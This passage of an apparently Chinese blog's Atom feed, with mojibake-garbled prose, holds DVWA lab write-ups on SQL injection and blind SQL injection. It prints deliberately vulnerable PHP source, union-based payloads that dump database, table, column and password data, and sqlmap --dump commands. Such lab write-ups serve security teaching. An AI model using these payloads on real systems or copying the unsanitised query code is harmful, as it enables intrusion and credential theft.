class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹ä¸Šä¼ æ•°æ®ï¼Œå¤§ä½“åŒSQL Injection ï¼ˆMediumï¼‰</p><h1 id="Highï¼š"><a href="#Highï¼š" class="headerlink" title="Highï¼š"></a>Highï¼š</h1><p>æŸ¥çœ‹æºç ï¼š </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“SQLè¯­å¥æŸ¥è¯¢ä¸ºç©ºçš„æ—¶å€™ï¼Œä¼šéšæœºæ‰§è¡Œsleep()å‡½æ•°ï¼Œå¹¶éšæœºå»¶è¿Ÿ2~4ç§’ï¼Œé‚£ä¹ˆç”¨æ—¶é—´ç›²æ³¨å°±å¯èƒ½è¢«å½±å“ï¼Œå› æ­¤è¿™å…³ç”¨å¸ƒå°”ç›²æ³¨ã€‚å…·ä½“åŒLowçº§åˆ«ä¸€æ ·ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;SQLç›²æ³¨ä¸ä¸€èˆ¬SQLæ³¨å…¥çš„åŒºåˆ«åœ¨äºä¸€èˆ¬SQLæ³¨å…¥çš„æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”SQL Injection</title>
    <link href="http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/"/>
    <id>http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/</id>
    <published>2021-03-09T13:20:45.370Z</published>
    <updated>2021-03-12T11:38:26.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>ä¹‹å‰æœ‰åˆ·è¿‡sqlilabsï¼Œå‰è¨€å°±ä¸å†ä»‹ç»äº†ã€‚</p><h1 id="Lowï¼š"><a href="#Lowï¼š" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h1><h2 id="æ‰‹å·¥æ³¨å…¥ï¼š"><a href="#æ‰‹å·¥æ³¨å…¥ï¼š" class="headerlink" title="æ‰‹å·¥æ³¨å…¥ï¼š"></a>æ‰‹å·¥æ³¨å…¥ï¼š</h2><p><strong>1ï¼‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ³¨å…¥ç‚¹æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</strong></p><p>1â€™ and â€˜1â€™=â€™1ï¼ŒæˆåŠŸ</p><p>1â€™ and â€˜1â€™=â€™2ï¼Œè¿”å›ç»“æœä¸ºç©ºï¼Œå­˜åœ¨è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ä¸”ä¸º<code>&#39;</code></p><p><strong>2ï¼‰çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</strong></p><p>1â€™ order by 1#ä¸æŠ¥é”™ï¼›</p><p>1â€™ order by 2#ä¸æŠ¥é”™ï¼›</p><p>1â€™ order by 3#æŠ¥é”™ï¼Œè¯´æ˜SQLæŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå³è¿™é‡Œçš„First nameã€Surnameã€‚</p><p><strong>3ï¼‰åˆ¤æ–­å›æ˜¾ä½</strong></p><p>0â€™ union select 1,2#![1](DVWAâ€”SQL Injection/1.png)</p><p>æœ‰ä¸¤ä¸ªå›æ˜¾ä½ã€‚</p><p><strong>4ï¼‰çˆ†åº“</strong></p><p>0â€™ union select 1,database()#![2](DVWAâ€”SQL Injection/2.png)</p><p><strong>5ï¼‰çˆ†è¡¨</strong></p><p>0â€™ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWAâ€”SQL Injection/3.png)</p><p><strong>6ï¼‰çˆ†åˆ—</strong></p><p>0â€™ union select 1,group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™#</p><p>![4](DVWAâ€”SQL Injection/4.png)</p><p><strong>7ï¼‰çˆ†å€¼</strong></p><p>0â€™ union select user,password from users#</p><p>![5](DVWAâ€”SQL Injection/5.png)</p><p>æˆ–0â€™ union select 1,group_concat(user,0x3a,password) from users# </p><p>![6](DVWAâ€”SQL Injection/6.png)</p><h2 id="åˆ©ç”¨sqlmapè‡ªåŠ¨æ³¨å…¥ï¼š"><a href="#åˆ©ç”¨sqlmapè‡ªåŠ¨æ³¨å…¥ï¼š" class="headerlink" title="åˆ©ç”¨sqlmapè‡ªåŠ¨æ³¨å…¥ï¼š"></a>åˆ©ç”¨sqlmapè‡ªåŠ¨æ³¨å…¥ï¼š</h2><p><strong>1ï¼‰è·å–æ‰€æœ‰æ•°æ®åº“</strong></p><p>sqlmap.py -u â€œurlâ€   â€“cookie â€œcookieä¸­çš„å†…å®¹â€ â€“dbs</p><p>spï¼šã€€-u ï¼š æŒ‡å®šurlæ‰«æ,ä½†urlå¿…é¡»å­˜åœ¨æŸ¥è¯¢å‚æ•°. ä¾‹: xxx.php?id=1 </p><p>â€‹            â€“dbsï¼šè·å–æ‰€æœ‰æ•°æ®åº“</p><p><strong>2ï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“å</strong></p><p>sqlmap.py -u â€œurlâ€   â€“cookie â€œcookieä¸­çš„å†…å®¹â€ â€“current-db</p><p>spï¼š â€“current-dbï¼šæŸ¥è¯¢å½“å‰æ•°æ®åº“æ˜µç§°</p><p><strong>3ï¼‰æŸ¥è¡¨å</strong></p><p>sqlmap.py -u â€œurlâ€ â€“cookie=â€cookieä¸­çš„å†…å®¹â€ â€“batch -D dvwa â€“tables</p><p>spï¼š-Dï¼šæŒ‡å®šæ•°æ®åº“</p><p>ã€€ã€€â€“tableï¼šæŸ¥è¯¢æ‰€æœ‰è¡¨</p><p>â€‹        â€“batchï¼šæ‰¹å¤„ç†,ä¹Ÿå°±æ˜¯ç³»ç»Ÿé»˜è®¤é€‰é¡¹(æŒ‰ç…§é»˜è®¤çš„é€‰é¡¹ å…¨è‡ªåŠ¨æ‰§è¡Œ)</p><p><strong>4ï¼‰æŸ¥åˆ—å</strong></p><p>sqlmap.py -u â€œurlâ€ â€“cookie=â€cookieä¸­çš„å†…å®¹â€ â€“batch -D dvwa -T users â€“columns</p><p>spï¼š-Tï¼šæŒ‡å®šè¡¨å</p><p>â€‹        â€“columnsï¼šæŸ¥è¯¢æ‰€æœ‰åˆ—</p><p><strong>5ï¼‰æŸ¥å€¼</strong></p><p>sqlmap.py -u â€œurlâ€ â€“cookie=â€cookieä¸­çš„å†…å®¹â€ â€“batch -D dvwa -C user,password â€“dump</p><p>spï¼š-Cï¼šæŒ‡å®šcolumns å¦‚æœä¸æŒ‡å®š,é»˜è®¤æ•´è¡¨</p><ul><li>æŸ¥çœ‹æºç ï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">     <span class="comment">// Get input  </span></span><br><span class="line">     $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];  </span><br><span class="line">     </span><br><span class="line">     <span class="comment">// Check database  </span></span><br><span class="line">     $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );         <span class="comment">// Get results  </span></span><br><span class="line">      <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;     </span><br><span class="line">      <span class="comment">// Get values     </span></span><br><span class="line">      $first = $row[<span class="string">&quot;first_name&quot;</span>];     </span><br><span class="line">      $last = $row[<span class="string">&quot;last_name&quot;</span>];     </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Feedback for end user     </span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;   &#125;   </span><br><span class="line">      mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]); </span><br><span class="line">      &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get input*</span></span><br><span class="line">  $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">  $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">  $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>; </span><br><span class="line">  $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get results </span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </span><br><span class="line">        <span class="comment">//Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä½¿ç”¨mysql_real_escape_string()å‡½æ•°è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼ˆå…¶ä¸­åŒ…æ‹¬åæ–œæ ï¼Œå•åŒå¼•å·ï¼‰ï¼ŒåŒæ—¶ç½‘é¡µç«¯é€‰æ‹©äº†ä¸‹æ‹‰é€‰æ‹©èœå•é™åˆ¶æˆ‘ä»¬è¾“å…¥ã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°æœ¬å…³çš„æ³¨å…¥ç‚¹ä¸ºæ•°å­—å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŠ“åŒ…çš„æ–¹å¼ä¿®æ”¹ä¸Šä¼ æ•°æ®ã€‚![7](DVWAâ€”SQL Injection/7.png)</p><h1 id="Highï¼š"><a href="#Highï¼š" class="headerlink" title="Highï¼š"></a>Highï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°è¿™å…³çš„æ•°æ®æäº¤é¡µé¢å’ŒæŸ¥è¯¢ç»“æœè¿”å›é¡µé¢ä¸æ˜¯åŒä¸€ä¸ªé¡µé¢</p><p>![8](DVWAâ€”SQL Injection/8.png)</p><p>ä½†æ˜¯è¿™å…³å¦‚æœç”¨æ‰‹å·¥æ³¨å…¥çš„è¯ï¼Œéš¾åº¦å’ŒLowçº§åˆ«æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆè¿™å…³é’ˆå¯¹é˜²å¾¡çš„æ˜¯ä¸€èˆ¬çš„sqlmapæ³¨å…¥ï¼Œå› ä¸ºsqlmapåœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œæ— æ³•åœ¨æ•°æ®æäº¤é¡µé¢ä¸Šè·å–æŸ¥è¯¢çš„ç»“æœï¼Œæ²¡æœ‰äº†åé¦ˆï¼Œä¹Ÿå°±æ²¡åŠæ³•è¿›ä¸€æ­¥æ³¨å…¥ã€‚</p><h1 id="Impossibleï¼š"><a href="#Impossibleï¼š" class="headerlink" title="Impossibleï¼š"></a>Impossibleï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;ä¹‹å‰æœ‰åˆ·è¿‡sqlilabsï¼Œå‰è¨€å°±ä¸å†ä»‹ç»äº†ã€‚&lt;/p&gt;
&lt;h1 id=&quot;Lowï¼š&quot;&gt;&lt;a href=&quot;#Lowï¼š&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”Cross Site Request Forgery (CSRF)</title>
    <link href="http://example.com/2021/03/04/DVWA%E2%80%94CSRF/"/>
    <id>http://example.com/2021/03/04/DVWA%E2%80%94CSRF/</id>
    <published>2021-03-04T10:16:08.000Z</published>
    <updated>2021-03-12T11:36:58.763Z</updated>
    
